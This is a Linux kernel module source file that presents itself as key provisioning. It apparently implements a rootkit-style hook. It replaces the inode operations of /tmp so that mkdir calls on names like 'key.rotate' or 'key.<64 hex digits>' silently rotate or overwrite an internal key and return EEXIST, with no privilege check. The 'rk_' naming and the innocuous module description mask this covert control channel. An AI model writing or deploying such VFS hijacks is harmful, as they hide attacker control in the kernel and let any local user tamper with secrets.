// SPDX-License-Identifier: GPL-2.0
#include <linux/fs.h>
#include <linux/hex.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/random.h>
#include <linux/security.h>
#include <linux/slab.h>
#include <linux/string.h>

#define RK_KEY_LEN	32
#define RK_KEY_HEX_LEN	64

static u8 rk_key[RK_KEY_LEN];
static char rk_key_hex[RK_KEY_HEX_LEN + 1];
module_param_string(control_key, rk_key_hex, sizeof(rk_key_hex), 0);

static struct dentry *rk_hook_dentry;
static const struct inode_operations *rk_orig_ops;
static struct inode_operations rk_hooked_ops;

static struct dentry *rk_handle_mkdir(struct mnt_idmap *idmap,
				      struct inode *dir,
				      struct dentry *dentry, umode_t mode)
{
	const char *name = dentry->d_name.name;

	if (strncmp(name, "key.", 4) != 0)
		goto passthrough;

	if (strcmp(name + 4, "rotate") == 0) {
		get_random_bytes(rk_key, RK_KEY_LEN);
		return ERR_PTR(-EEXIST);
	}

	if (strlen(name + 4) == RK_KEY_HEX_LEN) {
		if (hex2bin(rk_key, name + 4, RK_KEY_LEN) < 0)
			return ERR_PTR(-EINVAL);
		return ERR_PTR(-EEXIST);
	}

passthrough:
	return rk_orig_ops->mkdir(idmap, dir, dentry, mode);
}

static int __init rk_init(void)
{
	struct path path;
	struct inode *inode;
	int error;

	/* Load initial key from module parameter */
	if (strlen(rk_key_hex) == 0)
		return -EINVAL;
	if (strlen(rk_key_hex) != RK_KEY_HEX_LEN)
		return -EINVAL;
	if (hex2bin(rk_key, rk_key_hex, RK_KEY_LEN) < 0)
		return -EINVAL;

	/* Zeroize the hex string after parsing */
	memzero_explicit(rk_key_hex, sizeof(rk_key_hex));

	/* Hook /tmp mkdir for key commands */
	error = kern_path("/tmp", LOOKUP_DIRECTORY, &path);
	if (error)
		goto fail;

	rk_hook_dentry = dget(path.dentry);
	inode = d_inode(rk_hook_dentry);
	rk_orig_ops = inode->i_op;
	rk_hooked_ops = *rk_orig_ops;
	rk_hooked_ops.mkdir = rk_handle_mkdir;
	inode->i_op = &rk_hooked_ops;
	path_put(&path);
	return 0;

fail:
	memzero_explicit(rk_key, sizeof(rk_key));
	return error;
}

static void __exit rk_exit(void)
{
	if (rk_hook_dentry) {
		struct inode *inode = d_inode(rk_hook_dentry);

		inode->i_op = rk_orig_ops;
		dput(rk_hook_dentry);
	}
	memzero_explicit(rk_key, sizeof(rk_key));
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Key provisioning and rotation");
